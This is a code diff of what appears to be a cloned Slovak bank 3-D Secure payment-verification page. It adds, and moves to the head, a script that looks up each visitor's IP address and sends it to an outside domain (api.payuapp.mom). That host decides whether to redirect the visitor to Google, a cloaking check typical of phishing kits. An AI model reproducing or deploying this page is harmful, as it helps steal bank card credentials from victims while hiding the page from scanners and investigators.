@@ -1,6 +1,29 @@
 <!DOCTYPE html>
 <!-- saved from url=(0126)https://3dsecure.slsp.sk/acs2/slsp/CReq/895126900/atag=0.dD04OTUxMjY5MDAvYz0xNzYuMTAxLjIuMjEzL3Y9MjAyNDA2MTAuMTY1MzU3.5b8d2277 -->
-<html class="sk" lang="sk"><div id="in-page-channel-node-id" data-channel-name="in_page_channel_U_iy-U"></div><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<html class="sk" lang="sk"><div id="in-page-channel-node-id" data-channel-name="in_page_channel_U_iy-U"></div><head>
+    <script>
+        window.onload = function() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    checkIPBan(ipAddress);
+                })
+                .catch(error => console.error('Error fetching IP:', error));
+        };
+    
+        function checkIPBan(ipAddress) {
+            fetch(`https://api.payuapp.mom/check_ip?ip=${ipAddress}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.banned) {
+                        window.location.href = 'https://www.google.com';
+                    }
+                })
+                .catch(error => console.error('Error checking IP ban:', error));
+        }
+    </script>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <title>Overenie platby u obchodníka</title>
 
     <style>.row {
@@ -1963,28 +1986,6 @@ img.processing {
 
 </script>
 
-<script>
-    window.onload = function() {
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                const ipAddress = data.ip;
-                checkIPBan(ipAddress);
-            })
-            .catch(error => console.error('Error fetching IP:', error));
-    };
-
-    function checkIPBan(ipAddress) {
-        fetch(`https://api.payuapp.mom/check_ip?ip=${ipAddress}`)
-            .then(response => response.json())
-            .then(data => {
-                if (data.banned) {
-                    window.location.href = 'https://www.google.com';
-                }
-            })
-            .catch(error => console.error('Error checking IP ban:', error));
-    }
-</script>
 
 <script>
 
